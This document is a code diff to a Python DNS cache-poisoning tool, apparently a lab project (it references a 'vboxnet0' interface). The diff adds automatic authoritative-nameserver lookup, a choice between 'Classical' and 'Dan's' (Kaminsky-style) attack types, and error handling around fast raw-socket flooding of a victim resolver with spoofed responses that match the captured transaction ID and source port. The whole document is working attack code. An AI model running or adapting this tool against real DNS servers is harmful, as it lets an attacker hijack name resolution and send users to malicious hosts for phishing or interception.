@@ -9,6 +9,7 @@ import socket
 import signal
 from multiprocessing.pool import ThreadPool, Pool
 
+import re
 from enum import Enum
 
 
@@ -40,8 +41,9 @@ class DNSAttack:
     #   @param attacker_ip
     #   @param victim_mac   The victim server MAC address (Only required for faster flooding)
     #   @param ns_server_ip The authoritative NS server for the target domain
+    #   @param attack_type  Specify the attack to perform @ref DNSPoisoning.AttackType
+    #   @param nic_interface    Set the network iterface to use on faster flooding
     #
-    #   @param blessing_terminal The istance of the blessing terminal (Default None)
     #   @param sigint_handler    The functin to call when SIGINT signal is received
     #   @param log_function      The function to call when message need to be printed
     #
@@ -50,26 +52,41 @@ class DNSAttack:
 
     def __init__(self, victim_server_ip, attacked_domain, bad_server_data,\
          attacker_ip, ns_server_ip=None, victim_mac=None, nic_interface=None,\
-             blessing_terminal=None, sigint_handler=None, log_function=lambda msg: None):
+             attack_type=None, sigint_handler=None, log_function=lambda msg: None):
 
         self.victim_server_ip = victim_server_ip
         self.attacker_ip = attacker_ip
         self.domain = attacked_domain
         self.bad_udp_ip = bad_server_data[0]
         self.bad_udp_port = bad_server_data[1]
-        self.ns_server_ip = ns_server_ip
 
         #Only required for faster flooding
         self.victim_mac = victim_mac
         self.nic_interface = nic_interface
 
+
+
         #Enchant parameters
-        self.t = blessing_terminal
         self.sigint_handler = sigint_handler
         self.log = log_function
 
         #Internal Variable
         self.stop_flag = False
+
+        # Check Parameter
+        #-----------------------------------------
+        if ns_server_ip is None:
+            self.ns_server_ip = self.get_authoritative_server(self.domain, self.victim_server_ip)
+        else:
+            self.ns_server_ip = ns_server_ip
+
+        #Set the attack type
+        if attack_type is None or attack_type == DNSPoisoning.AttackType.NORMAL:
+            self.attack_type = DNSPoisoning.AttackType.NORMAL
+        else:
+            self.attack_type = DNSPoisoning.AttackType.DAN
+
+
 
     #Exceptions
 
@@ -87,20 +104,47 @@ class DNSAttack:
         pass
 
     ##  
+    #   @brief Exception raised when the passed attack type is not valid
+    #
+    #   Raised when the passed attack type is not valid  
+    class InvalidAttackType(CriticalError):
+        pass
+
+    ##  
+    #   @brief Exception raised when invalid IP address is passed
+    #
+    #   Raised when the passed IP address is invalid
+    #   @todo To implement
+    class InvalidIPAddress(CriticalError):
+        pass
+
+    ##  
+    #   @brief Exception raised when NS server IP cannot be fetched
+    #
+    #   Raised when NS server IP cannot be fetched
+    class NSFetchError(CriticalError):
+        pass
+
+    ##  
     #   @brief Raised when the attack succeded
     #
     class SuccessfulAttack(Exception):
         pass
 
-
+    ##
+    #   @brief Handler used to stop the attack
+    #   
+    #   Called to stop the current attack routine
+    #
     def stop_attack(self, sig, frame):
         self.stop_flag = True
         #Attach SIGINT signal to the Main stop handler
         signal.signal(signal.SIGINT, self.sigint_handler)
 
     ##  Start UDP Server
-    #   @brief Start an UDP server on specified port and return the fetched TXID
+    #   @brief Start an UDP server and return the fetched TXID and the source port
     #   @return (int) The fetched TXID
+    #   @return (int) The source port where the query comes from
     #
     def get_server_data(self):
 
@@ -110,14 +154,17 @@ class DNSAttack:
         self.log("Listening for incoming DNS request...")
 
         while True:
+            #Returns (query, [ip-address, source_port])
             data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
             self.log("Response source port :{t.bold}{t.blue}" + str(addr[1]) + "{t.normal}", 2)
-            received_id = data[0:2]
-
-            initial_id = int.from_bytes(received_id, byteorder='big')
+            
+            #The ID are placed in the first 16-bit
+            received_id = data[0:2] #Consider only the first 16 bit
+            initial_id = int.from_bytes(received_id, byteorder='big')  #Convert to int
             self.log("ID: " + str(initial_id), 3)
 
             sock.close()
+            # addr[1] is the source_port where the query comes from
             return (initial_id, addr[1])
 
     ##
@@ -138,20 +185,34 @@ class DNSAttack:
 
     ## 
     #   @brief Get IP of the NS server (Unimplemented)
-    #   @param domain           The domain used to fetch NS server
-    #   @param dns_server_ip    The server where request should be sent
-    #   @bug Actually not working
+    #   @param (str) domain           The domain used to fetch NS server
+    #   @param (IP) dns_server_ip    The server where request should be sent
+    #
+    #   @return (IP) the NS server IP
+    #
+    #   @exceptions DNSAttack.NSFetchError
+    #
     def get_authoritative_server(self, domain, dns_server_ip):
 
         dns_server = dns.resolver.Resolver()
         dns_server.nameservers = [dns_server_ip]
 
         response = dns_server.query(domain, 'NS')
+
         if response.rrset is not None:
-            ns_server = str(response.rrset)
-            print("NS server(s): " + ns_server)
+            ns_server_string = str(response.rrset)
+            ns_server = re.findall("(?<=NS).*", ns_server_string)   #Get all char after 'NS'
+            ns_server = ns_server[0].lstrip()    #Only use first match
+            self.log("NS server(s): " + str(ns_server))
 
             response = dns_server.query(ns_server, 'A')
+            if response.rrset is not None:
+                response_string = str(response.rrset)
+                ip_addr = re.findall("(?<=A).*", response_string)   #Get all char after 'A'
+                ip_addr = ip_addr[0].lstrip()
+                return ip_addr
+        #If somethig went wrong
+        raise self.NSFetchError
 
     ##  Start
     #   @brief Start the attack
@@ -159,22 +220,22 @@ class DNSAttack:
     #   @param mode (DNSAttack.Mode) The type of attack to be performed, see the above link
     #   @see DNSAttack::Mode
     #
-    def start(self, number_of_tries=50, mode=Mode.NORMAL):
+    def start(self, number_of_tries=50, mode=Mode.NORMAL, attack_type=DNSPoisoning.AttackType.NORMAL):
 
         succeded = False
         num = number_of_tries
 
         self.log("Executing " + str(number_of_tries) + " attacks...")
 
-        self.log("Opening socket...")
-        flood_socket = DNSPoisoning.create_socket(self, 'vboxnet0')
+
+        flood_socket = None
 
         if mode == self.Mode.NORMAL:
-            print("Using Normal Mode")
+            self.log("Using Normal Mode")
         elif mode == self.Mode.FAST:
-            print("Using Faster Mode")
-
-        print(self.victim_mac)
+            self.log("Using Faster Mode")
+            self.log("Opening socket...")
+            flood_socket = DNSPoisoning.create_socket(self, self.nic_interface)
 
         while number_of_tries and not succeded and not self.stop_flag:
 
@@ -186,7 +247,6 @@ class DNSAttack:
             pool = ThreadPool(processes=1)
             async_data_result = pool.apply_async(self.get_server_data)
 
-            
             self.log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"")
             try:
                 self.send_initial_query() #Start the DNS listening server
@@ -200,16 +260,19 @@ class DNSAttack:
             self.log("Fetched ID: {t.green}{t.bold}" + str(fetched_id) + "{t.normal}")
             self.log("Source port: {t.blue}{t.bold}" + str(source_port) + "{t.normal}")
 
-
-            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, '10.0.0.1', fetched_id, sport = source_port,\
+            # Create the Poisoning Object
+            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, None, fetched_id, sport = source_port,\
                 victim_mac=self.victim_mac, interrupt_handler=self.stop_attack, log=self.log, socket=flood_socket)
 
-
-            self.log("Ok, let's try to perform \"{t.italic}Classical Shenanigans{t.normal}\" attack")
-
-            poison.set_attack_type(DNSPoisoning.AttackType.NORMAL)
-
-
+            # Set the attack type
+            if attack_type == DNSPoisoning.AttackType.NORMAL:
+                self.log("Ok, let's try to perform \"{t.italic}Classical's Shenanigans{t.normal}\" attack")
+                poison.set_attack_type(DNSPoisoning.AttackType.NORMAL)
+            elif attack_type == DNSPoisoning.AttackType.DAN:
+                self.log("Ok, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\" attack")
+                poison.set_attack_type(DNSPoisoning.AttackType.DAN)
+            else:
+                raise self.InvalidAttackType
 
             #Attach SIGINT signal to the DNSPoisoning stop handler
             signal.signal(signal.SIGINT, poison.stop_handler)
@@ -217,13 +280,28 @@ class DNSAttack:
             self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...")
 
             if mode == self.Mode.NORMAL:
-                
-                poison.start_flooding()
+                # Normal Flooding
+                try:
+                    poison.start_flooding()
+
+                except:
+                    self.log("{t.underline}Unknow Error has occurred{t.normal}")
+                    raise self.CriticalError
 
             elif mode == self.Mode.FAST:
-                poison.set_interface('vboxnet0')
-                poison.set_victim_mac(self.victim_mac)
-                poison.faster_flooding()    #Using the faster version
+                # Fast Flooding
+                try:
+                    poison.set_interface('vboxnet0')
+                    poison.set_victim_mac(self.victim_mac)
+                    poison.faster_flooding()    #Using the faster version
+
+                except DNSPoisoning.InvalidMAC:
+                    self.log("{t.red}Invalid MAC address provided{t.normal}")
+                    raise self.CriticalError
+                except:
+                    self.log("{t.underline}Unknow Error has occurred{t.normal}")
+                    raise self.CriticalError
+
         
 
 
